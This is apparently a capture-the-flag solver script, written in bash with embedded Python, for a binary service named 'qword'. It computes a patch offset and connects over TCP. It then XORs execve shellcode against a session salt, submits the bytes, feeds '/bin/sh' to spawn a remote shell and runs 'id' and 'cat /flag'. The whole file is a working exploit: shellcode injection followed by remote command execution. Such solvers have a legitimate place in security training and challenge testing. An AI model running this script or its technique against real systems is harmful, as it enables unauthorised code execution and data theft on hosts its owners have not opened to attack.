#!/usr/bin/env bash
# Remote solver: drives the qword service over TCP.
#
#   ./solve/solve-remote.sh <host> <port>
#
# Computes the patch offset from the local qword.dbg, opens a TCP
# connection, parses the per-session salt out of the wrapper banner,
# XORs the desired shellcode against it, and submits the result. Then
# feeds /bin/sh\0 to the echo step and runs `id; cat /flag` in the shell.

set -euo pipefail

host=${1:?usage: $0 <host> <port>}
port=${2:?usage: $0 <host> <port>}

cd "$(dirname "$0")/../service"

# Build the binary if it isn't there yet (no Makefile in this repo).
dbg=qword.dbg
if [[ ! -f $dbg ]] || [[ src/qword.S -nt $dbg ]]; then
    as --64 -o src/qword.o src/qword.S
    ld -static -o qword.dbg src/qword.o
    cp qword.dbg qword
    strip qword
fi

vaddr_hex=$(objdump -t "$dbg" | awk '$NF == "patch_site" { print $1; exit }')
read text_vaddr_hex text_off_hex < <(
    objdump -h "$dbg" | awk '$2 == ".text" { print $4, $6; exit }'
)

vaddr=$((16#$vaddr_hex))
text_vaddr=$((16#$text_vaddr_hex))
text_off=$((16#$text_off_hex))
file_offset=$(( vaddr - text_vaddr + text_off ))

echo "patch_site -> file offset $file_offset (0x$(printf '%x' "$file_offset"))"
echo "talking to $host:$port ..."
echo "---"

python3 - "$host" "$port" "$file_offset" <<'PY'
import re
import socket
import sys
import time

host, port, offset = sys.argv[1], int(sys.argv[2]), sys.argv[3]

# The shellcode we want patch_site to hold AFTER runtime XOR-decode:
#   xor esi,esi ; xor edx,edx ; mov al,0x3b ; syscall
REAL_SHELLCODE = bytes.fromhex("31f631d2b03b0f05")

s = socket.create_connection((host, port), timeout=10)
s.settimeout(5)
buf = b""

def recv_until(token):
    global buf
    while token not in buf:
        chunk = s.recv(4096)
        if not chunk:
            return False
        buf += chunk
    return True

def consume(token):
    """Drop everything up to and including `token`."""
    global buf
    idx = buf.find(token)
    assert idx != -1, f"token {token!r} not in {buf!r}"
    buf = buf[idx + len(token):]

def send(b):
    s.sendall(b)
    time.sleep(0.05)

# 1) Wrapper asks "shall you reshape...?" — say yes.
recv_until(b"[y/N]")
send(b"y\n")

# 2) Wrapper prints "  the qword's salt for this rite: <16 hex>".
recv_until(b"salt for this rite:")
recv_until(b"\n")
m = re.search(rb"salt for this rite:\s*([0-9a-fA-F]{16})", buf)
if not m:
    sys.exit(f"could not find salt in stream: {buf!r}")
salt = bytes.fromhex(m.group(1).decode())
print(f"[*] salt    = {salt.hex()}")

encoded = bytes(a ^ b for a, b in zip(REAL_SHELLCODE, salt))
print(f"[*] encoded = {encoded.hex()}  (= shellcode XOR salt)")

# 3) Submit offset and the encoded patch bytes.
recv_until(b"wound fall?")
send(offset.encode() + b"\n")
recv_until(b"replace those bytes?")
send(encoded.hex().encode() + b"\n")

# 4) Echo step — supply "/bin/sh\0junk\n" so linebuf is a valid path.
send(b"/bin/sh\x00junk\n")

# 5) After execve fires we're talking to /bin/sh.
send(b"id\n")
send(b"cat /flag 2>/dev/null || cat flag 2>/dev/null || echo '(no flag)'\n")
send(b"exit\n")

# Drain.
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
except (TimeoutError, socket.timeout):
    pass

sys.stdout.write("--- transcript ---\n")
sys.stdout.flush()
sys.stdout.buffer.write(buf)
s.close()
PY

echo "---"
